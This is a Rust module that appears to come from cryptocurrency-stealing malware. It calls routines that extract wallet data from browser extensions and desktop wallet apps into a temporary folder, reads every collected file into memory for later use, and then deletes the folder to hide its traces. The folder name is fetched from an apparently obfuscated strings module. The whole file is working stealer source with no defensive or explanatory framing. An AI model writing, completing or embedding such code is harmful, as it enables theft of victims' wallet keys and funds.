pub mod browser_extensions;
pub mod desktop_apps;

use std::path::{Path, PathBuf};
use std::fs;
use crate::encrypted::*;

pub fn get_wallet_output_dir() -> PathBuf {
    std::env::temp_dir().join(s_wallet_dir())
}

pub fn collect_wallets() -> Vec<(String, Vec<u8>)> {
    let output_dir = get_wallet_output_dir();
    let _ = fs::create_dir_all(&output_dir);

    browser_extensions::extract_browser_wallets();
    desktop_apps::extract_desktop_wallets();

    let mut files = Vec::new();
    collect_files_recursive(&output_dir, &s_wallet_dir(), &mut files);
    
    let _ = fs::remove_dir_all(&output_dir);
    
    files
}

fn collect_files_recursive(base_path: &Path, current_path: &str, files: &mut Vec<(String, Vec<u8>)>) {
    if let Ok(entries) = fs::read_dir(base_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            
            let full_path = format!("{}/{}", current_path, name);
            
            if path.is_dir() {
                collect_files_recursive(&path, &full_path, files);
            } else if let Ok(contents) = fs::read(&path) {
                if !contents.is_empty() {
                    files.push((full_path, contents));
                }
            }
        }
    }
}
